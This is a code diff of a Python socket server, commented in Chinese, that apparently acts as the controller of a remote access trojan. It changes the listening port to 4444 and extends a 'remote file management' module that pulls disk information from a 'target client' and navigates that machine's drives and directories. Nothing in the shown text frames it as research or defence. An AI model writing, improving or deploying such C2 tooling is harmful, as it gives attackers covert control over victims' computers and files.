@@ -25,7 +25,7 @@ import pickle
 
 # 绑定的 IP 和端口（0.0.0.0 表示监听本机所有网卡）
 HOST = '0.0.0.0'
-PORT = 8080
+PORT = 4444
 
 # 创建 TCP 套接字
 backend = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -108,7 +108,10 @@ def recv_exact(sock, length):
 def handle_file(target_client, addr):
     """模块4：远程文件管理"""
     target_client.send(b'4')
-    recv_HD = recv_exact(target_client, 8).decode()
+    # 先读取 8 字节长度头，再读取实际的磁盘信息数据
+    len_data = recv_exact(target_client, 8)
+    hd_len = int(len_data.decode())
+    recv_HD = recv_exact(target_client, hd_len).decode(errors='ignore')
     print(f"{addr}的磁盘信息：{recv_HD}")
     path = ''  # 当前浏览路径，必须先 to 导航
     print("提示：请先使用 to <盘符> 导航到目标磁盘，例如 to C:")
@@ -123,11 +126,18 @@ def handle_file(target_client, addr):
         cmd = parts[0]
 
         if cmd == 'to':
-            # 导航: to C: 或 to C: Users Documents
+            # 导航: to C:
             if len(parts) < 2:
-                print("[-] 格式：to <盘符> [子目录...]")
+                print("[-] 格式：to <盘符/目录名> [子目录...]")
                 continue
-            path = parts[1] + '\\'
+            # 如果是盘符（如 C: D:），设为根目录；否则相对于当前路径追加
+            target = parts[1]
+            if len(target) == 2 and target[1] == ':':
+                # 绝对路径：盘符
+                path = target + '\\'
+            else:
+                # 相对路径：追加到当前路径
+                path = (path or '') + target + '\\'
             if len(parts) >= 3:
                 path += parts[2].replace(' ', '\\') + '\\'
             # 导航后自动列出目录
